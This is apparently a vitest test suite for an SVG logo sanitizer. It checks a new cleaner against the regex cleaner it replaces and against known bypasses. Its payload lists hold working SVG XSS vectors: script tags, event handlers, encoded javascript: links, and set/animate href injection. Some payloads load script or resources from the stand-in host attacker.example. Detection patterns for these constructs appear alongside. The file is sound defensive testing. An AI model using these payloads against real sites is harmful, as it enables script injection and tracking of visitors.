import { describe, it, expect } from 'vitest';
import sharp from 'sharp';
import { sanitizeSvg } from '../../src/services/logo';

/**
 * The cleaned SVG a customer uploads is written to their generated site as
 * `public/logo.svg` and served by `express.static` as `image/svg+xml` with no
 * `Content-Disposition`, so a visitor who opens `/logo.svg` directly gets it
 * as a top-level document: any script in it runs in the site's own origin.
 * (In the nav and the intake preview it is an `<img>`/data URI, where script
 * does not run.) So the cleaner has to be at least as strict as the regex one
 * it replaces, on every construct that one targeted, and close the bypasses
 * that one had.
 *
 * Two parts:
 *  - an ORACLE over a generated corpus: whatever the earlier regex cleaner
 *    (copied verbatim below as the reference) removes, the new cleaner must
 *    also remove. It guards against the rewrite being laxer anywhere.
 *  - a BYPASS corpus: concrete inputs the earlier cleaner lets through. Each
 *    fails on the version of `web/src/services/logo.ts` this replaced (its output still
 *    carries the dangerous construct) and passes here.
 */

// ---- the earlier regex cleaner, verbatim, as the oracle's reference ----------
function headSanitizeSvg(svg: string): string {
  let out = svg;
  out = out.replace(/<!DOCTYPE[^>[]*(\[[\s\S]*?\])?\s*>/gi, '');
  out = out.replace(/<\?[\s\S]*?\?>/g, (m) => (/^<\?xml\s/i.test(m) ? m : ''));
  for (const tag of ['script', 'foreignObject', 'iframe', 'embed', 'object', 'audio', 'video', 'canvas', 'link', 'meta']) {
    out = out.replace(new RegExp(`<${tag}\\b[\\s\\S]*?<\\/${tag}\\s*>`, 'gi'), '');
    out = out.replace(new RegExp(`<${tag}\\b[^>]*\\/?>`, 'gi'), '');
  }
  out = out.replace(/\son[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
  out = out.replace(/\s(?:xlink:)?href\s*=\s*("[^"]*"|'[^']*')/gi, (match: string, quoted: string) => {
    const value = quoted
      .slice(1, -1)
      .replace(/&#x([0-9a-f]+);?/gi, (_m, hex: string) => String.fromCodePoint(Math.min(parseInt(hex, 16), 0x10ffff)))
      .replace(/&#(\d+);?/g, (_m, dec: string) => String.fromCodePoint(Math.min(parseInt(dec, 10), 0x10ffff)))
      .replace(/[\u0000- ]+/g, '')
      .toLowerCase();
    return /^(javascript|vbscript|data:text\/html)/.test(value) ? '' : match;
  });
  out = out.replace(/@import[^;]*;?/gi, '');
  return out;
}

// ---- the dangerous-construct predicates -----------------------------------
// Each is true when the TEXT still carries the construct a browser would act
// on. A cleaner "removes" the construct when the predicate is false on its
// output. The decode mirrors how a URL is read (numeric refs, then control
// and space characters dropped), so an entity-encoded scheme is caught.
function decodeUrlish(text: string): string {
  return text
    .replace(/&#x([0-9a-f]+);?/gi, (_m, hex: string) => String.fromCodePoint(Math.min(parseInt(hex, 16), 0x10ffff)))
    .replace(/&#(\d+);?/g, (_m, dec: string) => String.fromCodePoint(Math.min(parseInt(dec, 10), 0x10ffff)))
    .replace(/[\u0000- ]+/g, '')
    .toLowerCase();
}

// Each predicate is true when the output STILL carries something a browser
// would act on dangerously. Constructs the allowlist legitimately keeps (an
// internal `url(#id)`, `<use href="#id">`, an external `<a>` link) are not
// flagged: the predicates below name real risks, not element presence.
const PREDICATES: Record<string, (text: string) => boolean> = {
  script: (t) => /<[a-z0-9]*:?script[\s>/]/i.test(t),
  eventHandler: (t) => /\son[a-z]+\s*=/i.test(t),
  foreignObject: (t) => /<[a-z0-9]*:?foreignobject/i.test(t),
  // Elements the allowlist drops entirely: embedders, and the animation
  // elements that can rewrite another element's href after load.
  forbiddenElement: (t) =>
    /<(iframe|embed|object|audio|video|canvas|link|meta|set|animate|animatetransform|animatemotion)\b/i.test(t),
  processingInstruction: (t) => /<\?(?!xml(\s|\?))/i.test(t),
  doctypeOrEntity: (t) => /<!doctype|<!entity/i.test(t),
  // A dangerous scheme in any attribute value or CSS url(): script execution
  // or an inline HTML document, however it is spelled.
  dangerousScheme: (t) => {
    const re = /="([^"]*)"|'([^']*)'|\burl\(\s*([^)]*?)\s*\)/gi;
    let m: RegExpExecArray | null;
    while ((m = re.exec(t)) !== null) {
      const value = decodeUrlish((m[1] ?? m[2] ?? m[3] ?? '').replace(/^['"]|['"]$/g, ''));
      if (/^(javascript|vbscript|data:text\/html)/.test(value)) return true;
    }
    return false;
  },
  // An external fetch the document performs on its own: an external reference
  // on use/image/feImage, an external CSS url(), or an @import.
  externalFetch: (t) => {
    if (/@import/i.test(t.replace(/\\/g, ''))) return true;
    const refs = /<(?:use|image|feimage)\b[^>]*?(?:xlink:)?href\s*=\s*"([^"]*)"/gi;
    let m: RegExpExecArray | null;
    while ((m = refs.exec(t)) !== null) {
      if (/^\s*(https?:|\/\/)/i.test(m[1])) return true;
    }
    const urls = /\burl\(\s*['"]?\s*(https?:|\/\/)/gi;
    return urls.test(t);
  },
};

function violations(text: string): string[] {
  return Object.entries(PREDICATES)
    .filter(([, test]) => test(text))
    .map(([name]) => name);
}

// ---- a generated corpus ---------------------------------------------------
const HOSTS = ['attacker.example', 'www.w3.org'];
const PAYLOADS = [
  '<script>alert(1)</script>',
  '<script src="//attacker.example/x.js"></script>',
  '<svg:script>alert(1)</svg:script>',
  '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">x</body></foreignObject>',
  '<rect width="9" height="9" onload="alert(1)"/>',
  '<rect width="9" height="9" ONCLICK="x"/>',
  '<a xlink:href="javascript:alert(1)"><rect width="4" height="4"/></a>',
  '<a href="Java&#09;script:alert(1)"><rect width="4" height="4"/></a>',
  '<a href="&#106;avascript:alert(1)"><rect width="4" height="4"/></a>',
  '<a href="vbscript:x"><rect width="4" height="4"/></a>',
  '<a href="data:text/html,<script>x</script>"><rect width="4" height="4"/></a>',
  '<use xlink:href="https://attacker.example/evil.svg#x"/>',
  '<use href="//attacker.example/evil.svg#x"/>',
  '<image href="https://attacker.example/track.png" width="9" height="9"/>',
  '<set attributeName="href" to="javascript:alert(1)"/>',
  '<animate attributeName="xlink:href" to="javascript:alert(1)"/>',
  '<style>@import url(https://attacker.example/x.css);</style>',
  '<style>rect{fill:url(https://attacker.example/x)}</style>',
  '<rect width="9" height="9" style="fill:url(https://attacker.example/x)"/>',
  '<iframe src="https://attacker.example"></iframe>',
  '<rect width="9" height="9" fill="#2255cc"/>',
  '<circle cx="5" cy="5" r="4" fill="#cc2222"/>',
];
const WRAPPERS: Array<(p: string) => string> = [
  (p) => p,
  (p) => `<g>${p}</g>`,
  (p) => `<g><g>${p}</g></g>`,
  (p) => `<!-- comment -->${p}`,
  (p) => `<desc>note</desc>${p}`,
];

function corpus(): string[] {
  const out: string[] = [];
  for (const payload of PAYLOADS) {
    for (const wrap of WRAPPERS) {
      for (const host of HOSTS) {
        out.push(
          `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40">` +
            wrap(payload.replace('attacker.example', host)) +
            `</svg>`
        );
      }
    }
  }
  return out;
}

describe('oracle: the new cleaner is at least as strict as the earlier regex cleaner', () => {
  it('removes every dangerous construct the earlier cleaner removed, across the corpus', () => {
    const laxer: Array<{ svg: string; construct: string }> = [];
    for (const svg of corpus()) {
      const headOut = headSanitizeSvg(svg);
      const newOut = sanitizeSvg(svg);
      const headViolations = new Set(violations(headOut));
      for (const construct of violations(newOut)) {
        // The new output carries a dangerous construct the earlier output did
        // not: the rewrite is laxer there. (The reverse, the earlier cleaner laxer than the new one,
        // is the point of the rewrite and is covered by the bypass tests.)
        if (!headViolations.has(construct)) laxer.push({ svg, construct });
      }
    }
    expect(laxer).toEqual([]);
  });

  it('writes, for every document in the corpus, a file that a real SVG reader accepts', async () => {
    // logo.ts stores what the cleaner writes without opening it, so that the
    // image library never sees an upload. The corpus stands in for that
    // check: each cleaned document here is a few hundred bytes of plain
    // shapes, and reading its header draws nothing.
    const refused: string[] = [];
    let notWellFormed = 0;
    for (const svg of corpus()) {
      const cleaned = sanitizeSvg(svg);
      if (!cleaned) {
        // The one payload with a raw "<" inside an attribute value is not
        // well-formed XML, and the cleaner refuses such a document whole.
        expect(svg).toContain('href="data:text/html,<script>');
        notWellFormed += 1;
        continue;
      }
      try {
        const header = await sharp(Buffer.from(cleaned, 'utf8')).metadata();
        if (header.format !== 'svg' || header.width !== 40 || header.height !== 40) refused.push(cleaned);
      } catch (err) {
        refused.push(`${(err as Error).message}: ${cleaned}`);
      }
    }
    expect(refused).toEqual([]);
    // That payload, in each wrapper and for each host.
    expect(notWellFormed).toBe(WRAPPERS.length * HOSTS.length);
  });
});

describe('bypass corpus: constructs the earlier cleaner let through, now removed', () => {
  // Each entry fails on the earlier cleaner (its output still trips the named predicate).
  const cases: Array<{ name: string; svg: string; predicate: keyof typeof PREDICATES }> = [
    {
      name: 'external <use> reference',
      svg: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40"><use xlink:href="https://attacker.example/evil.svg#x"/></svg>',
      predicate: 'externalFetch',
    },
    {
      name: 'external <image> reference',
      svg: '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><image href="https://attacker.example/track.png" width="9" height="9"/></svg>',
      predicate: 'externalFetch',
    },
    {
      name: '<set> injecting an href',
      svg: '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><a><set attributeName="href" to="javascript:alert(1)"/><rect width="4" height="4"/></a></svg>',
      predicate: 'forbiddenElement',
    },
    {
      name: '<animate> injecting an href',
      svg: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40"><a><animate attributeName="xlink:href" to="javascript:alert(1)"/><rect width="4" height="4"/></a></svg>',
      predicate: 'forbiddenElement',
    },
    {
      name: 'prefixed <svg:script>',
      svg: '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><svg:script>alert(1)</svg:script></svg>',
      predicate: 'script',
    },
    {
      name: 'external url() in a <style> block',
      svg: '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><style>rect{fill:url(https://attacker.example/x)}</style><rect width="9" height="9"/></svg>',
      predicate: 'externalFetch',
    },
    {
      name: 'external url() in a style attribute',
      svg: '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="9" height="9" style="fill:url(https://attacker.example/x)"/></svg>',
      predicate: 'externalFetch',
    },
  ];

  it.each(cases)('$name', ({ svg, predicate }) => {
    // The construct is present in the input and tripped by the earlier cleaner's output.
    expect(PREDICATES[predicate](headSanitizeSvg(svg))).toBe(true);
    // The new cleaner removes it.
    const cleaned = sanitizeSvg(svg);
    expect(PREDICATES[predicate](cleaned)).toBe(false);
  });
});

describe('the cleaner keeps a legitimate logo intact', () => {
  it('keeps shapes, gradients, groups, text, an internal <use>, and safe links', () => {
    const logo = [
      '<?xml version="1.0" encoding="UTF-8"?>',
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 120 40">',
      '  <defs>',
      '    <linearGradient id="g"><stop offset="0" stop-color="#2255cc"/><stop offset="1" stop-color="#cc2222"/></linearGradient>',
      '    <g id="mark"><circle cx="20" cy="20" r="16" fill="url(#g)"/></g>',
      '  </defs>',
      '  <use href="#mark"/>',
      '  <g transform="translate(44 0)">',
      '    <rect width="70" height="40" fill="#f3f3f3"/>',
      '    <text x="8" y="26" font-family="Georgia" font-size="18" fill="#222">Studio</text>',
      '  </g>',
      '  <a href="https://studio.example"><rect x="0" y="36" width="120" height="4" fill="#2255cc"/></a>',
      '</svg>',
    ].join('\n');
    const cleaned = sanitizeSvg(logo);
    expect(cleaned).toContain('<linearGradient id="g">');
    expect(cleaned).toContain('<stop offset="0" stop-color="#2255cc"/>');
    expect(cleaned).toContain('fill="url(#g)"');
    expect(cleaned).toContain('<use href="#mark"/>');
    expect(cleaned).toContain('<text x="8" y="26" font-family="Georgia" font-size="18" fill="#222">Studio</text>');
    expect(cleaned).toContain('<a href="https://studio.example">');
    expect(cleaned).toContain('viewBox="0 0 120 40"');
    expect(violations(cleaned)).toEqual([]);
  });
});
